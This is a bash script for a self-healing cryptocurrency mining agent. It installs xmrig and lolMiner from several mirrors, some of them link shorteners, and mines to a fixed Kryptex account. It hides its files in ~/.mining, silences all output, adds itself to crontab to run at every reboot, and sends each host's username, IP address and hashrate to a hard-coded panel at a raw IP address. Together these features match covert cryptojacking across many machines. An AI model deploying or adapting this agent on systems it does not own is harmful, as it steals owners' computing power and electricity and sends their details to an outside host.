#!/bin/bash
# MINING AGENT v4.2 — PANEL-ONLY | SELF-HEALING | ULTRA PORTABLE
# No local logs, no Telegram. Only panel heartbeat/log push.
# Launch: ALLOW_MINING=1 bash ./mining_agent.sh
set -u

#############################################
# CONFIGURATION (EDIT IF NEEDED)
#############################################
ALLOW_MINING="${ALLOW_MINING:-0}"
TEST_MODE="${TEST_MODE:-0}"
INTERVAL="${INTERVAL:-60}"                # watchdog loop interval (sec)
HEARTBEAT_INTERVAL="${HEARTBEAT_INTERVAL:-300}"  # panel heartbeat interval (sec)
INSTALL_RETRIES="${INSTALL_RETRIES:-5}"
DOWNLOAD_TIMEOUT="${DOWNLOAD_TIMEOUT:-45}"
MAX_RESTARTS_BEFORE_REINSTALL="${MAX_RESTARTS_BEFORE_REINSTALL:-3}"
RESTART_WINDOW_SECONDS="${RESTART_WINDOW_SECONDS:-3600}"   # 1 hour
REINSTALL_COOLDOWN="${REINSTALL_COOLDOWN:-1800}"           # 30 min after reinstall

# Panel settings
PANEL_BASE_URL="${PANEL_BASE_URL:-http://31.76.50.139}"
HEARTBEAT_ENDPOINT="${HEARTBEAT_ENDPOINT:-/api/heartbeat}"
LOGS_ENDPOINT="${LOGS_ENDPOINT:-/api/logs/push}"
PANEL_USERNAME="${PANEL_USERNAME:-$(whoami)}"

# Kryptex Account
KRIPTEX="krxX3PVQVR"

# Pools (multiple endpoints for failover)
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"
RVN_POOL="rvn.kryptex.network:6013"

# Paths (only essential directories remain)
BASE="${HOME}/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
PID_CPU="$RUN/cpu.pid"
PID_GPU="$RUN/gpu.pid"
STATE_CPU="$RUN/cpu.state"
STATE_GPU="$RUN/gpu.state"
AGENT_LOCK="/tmp/mining_agent.lock"

#############################################
# DEPENDENCY CHECK & FALLBACKS
#############################################

command_exists() { command -v "$1" >/dev/null 2>&1; }

ensure_http_client() {
  command_exists curl && { HTTP_CLIENT="curl"; return 0; }
  command_exists wget && { HTTP_CLIENT="wget"; return 0; }
  command_exists busybox && { HTTP_CLIENT="busybox"; return 0; }
  return 1
}

http_get() {
  _url="$1"; _timeout="${2:-$DOWNLOAD_TIMEOUT}"
  case "$HTTP_CLIENT" in
    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.2" --retry 2 --retry-delay 3 "$_url" 2>/dev/null ;;
    wget) wget -qO- --timeout="$_timeout" --user-agent="MiningAgent/4.2" --tries=2 "$_url" 2>/dev/null ;;
    busybox) busybox wget -qO- -T "$_timeout" "$_url" 2>/dev/null ;;
    *) return 1 ;;
  esac
}

download_file() {
  _out="$1"; _url="$2"; _timeout="${3:-$DOWNLOAD_TIMEOUT}"
  case "$HTTP_CLIENT" in
    curl) curl -sL --connect-timeout 10 -m "$_timeout" -A "MiningAgent/4.2" --retry 2 --retry-delay 3 -o "$_out" "$_url" 2>/dev/null ;;
    wget) wget -q --timeout="$_timeout" --user-agent="MiningAgent/4.2" --tries=2 -O "$_out" "$_url" 2>/dev/null ;;
    busybox) busybox wget -T "$_timeout" -O "$_out" "$_url" 2>/dev/null ;;
    *) return 1 ;;
  esac
  [ -s "$_out" ] && return 0 || return 1
}

#############################################
# SYSTEM DETECTION
#############################################

get_arch() {
  _arch=$(uname -m 2>/dev/null || echo "x86_64")
  case "$_arch" in
    x86_64|x64|amd64) echo "x64" ;;
    aarch64|arm64) echo "arm64" ;;
    armv7l|armhf) echo "arm" ;;
    *) echo "x64" ;;
  esac
}

get_os() {
  if [ -f /etc/os-release ]; then
    . /etc/os-release 2>/dev/null
    echo "${ID:-unknown}" | tr '[:upper:]' '[:lower:]'
  elif [ -f /etc/alpine-release ]; then echo "alpine"
  elif [ -f /etc/centos-release ]; then echo "centos"
  else echo "unknown"
  fi
}

check_disk_space() {
  _required_mb="${1:-100}"
  _available=$(df -m "$BASE" 2>/dev/null | tail -1 | awk '{print $4}')
  [ "${_available:-0}" -ge "$_required_mb" ] && return 0 || return 1
}

has_gpu() {
  (command_exists lspci && lspci 2>/dev/null | grep -qiE 'vga|3d|display') ||
  (command_exists nvidia-smi) ||
  (command_exists rocm-smi) ||
  (find /dev/dri -name 'card*' 2>/dev/null | head -1)
}

#############################################
# IP ADDRESS (EXTERNAL + LOCAL FALLBACK)
#############################################

get_report_ip() {
  for _src in \
    "https://api.ipify.org" \
    "https://ifconfig.me/ip" \
    "https://icanhazip.com" \
    "https://ident.me" \
    "https://ipinfo.io/ip" \
    "https://api.ip.sb/ip"
  do
    _ip=$(http_get "$_src" 15 2>/dev/null | tr -d '[:space:]' | grep -E '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | head -1)
    [ -n "$_ip" ] && [ "$_ip" != "127.0.0.1" ] && echo "$_ip" && return 0
  done

  _local_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
  [ -n "$_local_ip" ] && [ "$_local_ip" != "127.0.0.1" ] && echo "$_local_ip" && return 0
  echo "0.0.0.0"
}

get_node_id() {
  [ "$TEST_MODE" = "1" ] && echo "TEST" && return
  hostname 2>/dev/null || echo "UNKNOWN"
}

#############################################
# PROCESS MANAGEMENT
#############################################

is_alive() {
  _pidfile="$1"; _name="$2"
  [ -f "$_pidfile" ] && _pid=$(cat "$_pidfile" 2>/dev/null) && [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null && return 0
  command_exists pgrep && pgrep -f "$_name" >/dev/null 2>&1 && return 0
  ps aux 2>/dev/null | grep -v grep | grep -q "$_name" && return 0
  return 1
}

kill_miner() {
  _name="$1"
  command_exists pkill && pkill -f "$_name" 2>/dev/null || true
  command_exists killall && killall "$_name" 2>/dev/null || true
  sleep 1
}

#############################################
# RESTART TRACKING (WITH COOLDOWN)
#############################################

init_state() { [ -f "$1" ] || echo "0|0|0" > "$1"; }
get_state_field() { [ -f "$1" ] && cut -d'|' -f"$2" "$1" 2>/dev/null || echo "0"; }

update_restart_state() {
  _statefile="$1"; _now=$(date +%s)
  _count=$(get_state_field "$_statefile" 1)
  _last=$(get_state_field "$_statefile" 2)
  _last_reinstall=$(get_state_field "$_statefile" 3)
  if [ $((_now - _last)) -gt "$RESTART_WINDOW_SECONDS" ]; then _count=0; fi
  _count=$((_count + 1))
  echo "${_count}|${_now}|${_last_reinstall}" > "$_statefile"
  echo "$_count"
}

should_reinstall() {
  _statefile="$1"; _count=$(update_restart_state "$_statefile")
  _last_reinstall=$(get_state_field "$_statefile" 3)
  _now=$(date +%s)
  [ $((_now - _last_reinstall)) -lt "$REINSTALL_COOLDOWN" ] && return 1
  [ "$_count" -ge "$MAX_RESTARTS_BEFORE_REINSTALL" ] && return 0 || return 1
}

reset_restart_state() { echo "0|0|$(date +%s)" > "$1"; }

#############################################
# INSTALLERS (5 MIRRORS + RETRIES)
#############################################

install_xmrig() {
  kill_miner "xmrig"
  rm -f "$BIN/cpu/xmrig" 2>/dev/null
  rm -rf "$BIN/cpu/xmrig"* 2>/dev/null
  _arch=$(get_arch)
  _mirrors="
    https://xmrig.com/download/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://gitlab.com/xmrig/xmrig/-/releases/v6.25.0/downloads/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://mirror.xmrig.com/xmrig-6.25.0-linux-static-${_arch}.tar.gz
    https://cdn.xmrig.com/xmrig-6.25.0-linux-static-${_arch}.tar.gz
  "
  _attempt=1
  while [ $_attempt -le "$INSTALL_RETRIES" ]; do
    for _url in $_mirrors; do
      if download_file "/tmp/xmrig.tgz" "$_url" 45; then
        mkdir -p "$BIN/cpu" 2>/dev/null
        if tar -xzf /tmp/xmrig.tgz -C "$BIN/cpu" --strip-components=1 2>/dev/null; then
          chmod +x "$BIN/cpu/xmrig" 2>/dev/null
          if [ -x "$BIN/cpu/xmrig" ] && "$BIN/cpu/xmrig" --version >/dev/null 2>&1; then
            rm -f /tmp/xmrig.tgz 2>/dev/null
            return 0
          fi
        fi
      fi
      rm -f /tmp/xmrig.tgz 2>/dev/null
    done
    _attempt=$((_attempt + 1))
    [ $_attempt -le "$INSTALL_RETRIES" ] && sleep 5
  done
  return 1
}

install_lolminer() {
  kill_miner "lolMiner"
  rm -f "$BIN/gpu/lolMiner" 2>/dev/null
  rm -rf "$BIN/gpu/lolMiner"* 2>/dev/null
  _mirrors="
    https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz
    https://www.lorexxar.ch/lolminer/lolMiner_v1.98a_Lin64.tar.gz
    https://bit.ly/lolminer198a
    https://tinyurl.com/lolminer198
    https://github.com/Lolliedieb/lolMiner-releases/releases/latest/download/lolMiner_v1.98a_Lin64.tar.gz
  "
  _attempt=1
  while [ $_attempt -le "$INSTALL_RETRIES" ]; do
    for _url in $_mirrors; do
      if download_file "/tmp/lolminer.tgz" "$_url" 45; then
        mkdir -p "$BIN/gpu" 2>/dev/null
        if tar -xzf /tmp/lolminer.tgz -C "$BIN/gpu" --strip-components=1 2>/dev/null; then
          chmod +x "$BIN/gpu/lolMiner" 2>/dev/null
          if [ -x "$BIN/gpu/lolMiner" ] && "$BIN/gpu/lolMiner" --version >/dev/null 2>&1; then
            rm -f /tmp/lolminer.tgz 2>/dev/null
            return 0
          fi
        fi
      fi
      rm -f /tmp/lolminer.tgz 2>/dev/null
    done
    _attempt=$((_attempt + 1))
    [ $_attempt -le "$INSTALL_RETRIES" ] && sleep 5
  done
  return 1
}

install_miniz() {
  kill_miner "miniz"
  rm -f "$BIN/gpu/miniz" 2>/dev/null
  _mirrors="
    https://github.com/miniz-mining/miniz/releases/download/v3.2pl1/miniz-3.2pl1-x64-linux.tar.gz
    https://miniz.ch/download/miniz-3.2pl1-x64-linux.tar.gz
  "
  for _url in $_mirrors; do
    if download_file "/tmp/miniz.tar.gz" "$_url" 45; then
      mkdir -p "$BIN/gpu" 2>/dev/null
      if tar -xzf /tmp/miniz.tar.gz -C "$BIN/gpu" 2>/dev/null; then
        chmod +x "$BIN/gpu/miniz" 2>/dev/null
        [ -x "$BIN/gpu/miniz" ] && return 0
      fi
    fi
    rm -f /tmp/miniz.tar.gz 2>/dev/null
  done
  return 1
}

#############################################
# MINER STARTERS (output -> /dev/null)
#############################################

start_cpu() {
  is_alive "$PID_CPU" "xmrig" && return 0
  _retry=1
  while [ $_retry -le 3 ]; do
    "$BIN/cpu/xmrig" \
      -o "$XMR_POOL" \
      -u "$KRIPTEX.$(get_node_id)" -p x \
      --algo randomx \
      --http-enabled --http-host 127.0.0.1 --http-port 16000 \
      --cpu-max-threads-hint=90 \
      --no-cpu-affinity \
      --donate-level 0 \
      --tls >/dev/null 2>&1 &
    echo $! > "$PID_CPU"
    sleep 4
    is_alive "$PID_CPU" "xmrig" && return 0
    _retry=$((_retry + 1))
    sleep 2
  done
  return 1
}

start_gpu() {
  is_alive "$PID_GPU" "lolMiner" && return 0
  _retry=1
  while [ $_retry -le 3 ]; do
    "$BIN/gpu/lolMiner" \
      --algo ETCHASH \
      --pool "$ETC_POOL" \
      --user "$KRIPTEX.$(get_node_id)" \
      --ethstratum ETCPROXY \
      --apihost 127.0.0.1 --apiport 8080 \
      --watchdog exit \
      --tls on >/dev/null 2>&1 &
    echo $! > "$PID_GPU"
    sleep 6
    is_alive "$PID_GPU" "lolMiner" && return 0
    _retry=$((_retry + 1))
    sleep 3
  done
  return 1
}

#############################################
# AUTOSTART
#############################################

ensure_autostart() {
  _script_path="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
  _entry="@reboot ALLOW_MINING=1 bash $_script_path"
  _current=$(crontab -l 2>/dev/null || echo "")
  if ! echo "$_current" | grep -qF "$_script_path"; then
    (echo "$_current"; echo "$_entry") | crontab - 2>/dev/null || true
  fi
}

#############################################
# PANEL COMMUNICATION
#############################################

send_heartbeat() {
  _msg="$1"
  _data=$(cat <<EOF
{
  "username": "$PANEL_USERNAME",
  "ip": "$REPORT_IP",
  "event": "heartbeat",
  "run_id": "$RUN_ID",
  "message": "${_msg:0:1500}"
}
EOF
)
  _url="${PANEL_BASE_URL}${HEARTBEAT_ENDPOINT}"
  if command_exists curl; then
    curl -s --connect-timeout 5 -m 10 -X POST "$_url" \
      -H "Content-Type: application/json" \
      -d "$_data" >/dev/null 2>&1
  elif command_exists wget; then
    wget --timeout=10 -qO- --post-data="$_data" --header="Content-Type: application/json" "$_url" >/dev/null 2>&1
  fi
}

send_log() {
  _event="${1:-log}"
  _message="${2:-}"
  _event=$(echo "$_event" | tr '[:upper:]' '[:lower:]' | cut -c1-64)
  _msg_trimmed="${_message:0:1500}"
  _data=$(cat <<EOF
{
  "username": "$PANEL_USERNAME",
  "ip": "$REPORT_IP",
  "event": "$_event",
  "run_id": "$RUN_ID",
  "message": "$_msg_trimmed"
}
EOF
)
  _url="${PANEL_BASE_URL}${LOGS_ENDPOINT}"
  if command_exists curl; then
    curl -s --connect-timeout 5 -m 10 -X POST "$_url" \
      -H "Content-Type: application/json" \
      -d "$_data" >/dev/null 2>&1
  elif command_exists wget; then
    wget --timeout=10 -qO- --post-data="$_data" --header="Content-Type: application/json" "$_url" >/dev/null 2>&1
  fi
}

heartbeat() {
  _cpu_ok="0"; is_alive "$PID_CPU" "xmrig" && _cpu_ok="1"
  _gpu_ok="0"; is_alive "$PID_GPU" "lolMiner" && _gpu_ok="1"
  _cpu_hr=$(get_cpu_hashrate)
  _gpu_hr=$(get_gpu_hashrate)
  _uptime=$(get_uptime)
  _msg="CPU:${_cpu_ok} (${_cpu_hr} H/s) GPU:${_gpu_ok} (${_gpu_hr} H/s) Up:${_uptime}s IP:${REPORT_IP}"
  send_heartbeat "$_msg"
}

get_uptime() {
  _u=$(awk '{printf "%d",$1}' /proc/uptime 2>/dev/null) || _u="0"
  echo "$_u"
}

get_cpu_hashrate() {
  _hr=$(http_get "http://127.0.0.1:16000/1/summary" 5 2>/dev/null | grep -oE '"hashrate":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1)
  echo "${_hr:-0}"
}

get_gpu_hashrate() {
  _hr=$(http_get "http://127.0.0.1:8080/summary" 5 2>/dev/null | grep -oE '"Performance":\s*[0-9.]+' | grep -oE '[0-9.]+' | head -1)
  echo "${_hr:-0}"
}

#############################################
# RECOVERY & SELF-HEALING
#############################################

recover_cpu() {
  if should_reinstall "$STATE_CPU"; then
    send_log "reinstall" "CPU miner unstable, reinstalling"
    reset_restart_state "$STATE_CPU"
    if install_xmrig && start_cpu; then
      send_log "info" "CPU reinstall successful"
    else
      send_log "error" "CPU reinstall failed"
    fi
  else
    start_cpu || true
  fi
}

recover_gpu() {
  if should_reinstall "$STATE_GPU"; then
    send_log "reinstall" "GPU miner unstable, reinstalling"
    reset_restart_state "$STATE_GPU"
    if install_lolminer; then
      start_gpu && send_log "info" "GPU reinstall (lolMiner) successful"
    else
      install_miniz && start_gpu && send_log "info" "GPU reinstall (miniZ) successful" || send_log "error" "GPU reinstall failed"
    fi
  else
    start_gpu || true
  fi
}

#############################################
# LOCK FILE (PREVENT DUPLICATE AGENT)
#############################################

acquire_lock() {
  if [ -f "$AGENT_LOCK" ]; then
    _pid=$(cat "$AGENT_LOCK" 2>/dev/null)
    if kill -0 "$_pid" 2>/dev/null; then exit 1; fi
    rm -f "$AGENT_LOCK"
  fi
  echo $$ > "$AGENT_LOCK"
  trap "rm -f $AGENT_LOCK" EXIT
}

#############################################
# MAIN
#############################################

main() {
  [ "$ALLOW_MINING" = "1" ] || exit 0
  acquire_lock

  mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" 2>/dev/null || exit 1
  ensure_http_client || exit 1

  NODE_ID=$(get_node_id)
  REPORT_IP=$(get_report_ip)
  RUN_ID="${NODE_ID}-$(date +%s)-$$"
  _arch=$(get_arch)
  _os=$(get_os)

  init_state "$STATE_CPU"
  init_state "$STATE_GPU"

  if ! check_disk_space 200; then
    send_log "error" "No disk space"
    exit 1
  fi

  GPU_ENABLED=0
  has_gpu && GPU_ENABLED=1

  _cpu_ok=0
  if [ ! -x "$BIN/cpu/xmrig" ]; then
    install_xmrig && _cpu_ok=1
  else
    _cpu_ok=1
  fi

  _gpu_ok=0
  if [ "$GPU_ENABLED" = "1" ]; then
    if [ ! -x "$BIN/gpu/lolMiner" ]; then
      if install_lolminer; then
        _gpu_ok=1
      else
        install_miniz && _gpu_ok=1
      fi
    else
      _gpu_ok=1
    fi
  fi

  ensure_autostart

  [ "$_cpu_ok" = "1" ] && start_cpu
  [ "$_gpu_ok" = "1" ] && start_gpu

  sleep 10

  if [ "$_cpu_ok" = "1" ] || [ "$_gpu_ok" = "1" ]; then
    _status="CPU:${_cpu_ok} GPU:${_gpu_ok}"
    send_log "info" "Mining started: ${_status}"
  else
    send_log "error" "Mining setup failed"
    exit 1
  fi

  _last_heartbeat=0
  while true; do
    [ "$_cpu_ok" = "1" ] && ! is_alive "$PID_CPU" "xmrig" && recover_cpu
    [ "$_gpu_ok" = "1" ] && ! is_alive "$PID_GPU" "lolMiner" && recover_gpu

    if [ "$_gpu_ok" = "1" ]; then
      _hr=$(get_gpu_hashrate)
      if [ "$_hr" = "0" ]; then
        sleep 20
        _hr2=$(get_gpu_hashrate)
        if [ "$_hr2" = "0" ]; then
          if should_reinstall "$STATE_GPU"; then
            send_log "reinstall" "GPU zero HR persistent, reinstalling"
            reset_restart_state "$STATE_GPU"
            install_lolminer && start_gpu || true
          else
            update_restart_state "$STATE_GPU" >/dev/null
            start_gpu || true
          fi
        fi
      fi
    fi

    _now=$(date +%s)
    if [ $((_now - _last_heartbeat)) -ge "$HEARTBEAT_INTERVAL" ]; then
      heartbeat
      _last_heartbeat=$_now
    fi

    sleep "$INTERVAL"
  done
}

main "$@"
